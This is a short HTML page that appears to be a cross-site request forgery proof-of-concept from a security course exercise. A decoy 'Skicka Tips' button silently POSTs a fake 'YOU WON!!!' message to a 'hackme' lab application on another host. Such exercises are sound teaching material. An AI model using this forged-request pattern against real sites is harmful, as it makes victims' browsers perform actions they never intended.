<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<style>
.centered {
  position: fixed; /* or absolute */
  top: 50%;
  left: 50%;
}
</style>
<body>
<div class="centered">
  <h1>Test</h1>
</div class="centered">
  <div>
  <form id="submission" method="post">
      <input name="post_submit" type="button" value="Skicka Tips">
  </form>
  </div>
<script>
//These JS functions probably aren't necessary, and I'm probably doing this the long way.
//But eh. It works. :P
  $('#submission').submit(function() {
      // submit the form
      var title = "YOU WON!!!";
      var message = "You have been selected for a free flying dragon ride.";
      $.ajax({
			    type: "POST",
			    url: "http://infosec-020-105/hackme-personal/post.php",
			    data: "post_submit=set&title=" + title + "&message=" + message,
			 });
  });
  $('[name=post_submit]').click(function(){
        $('#submission').submit();
    });
</script>
</body>
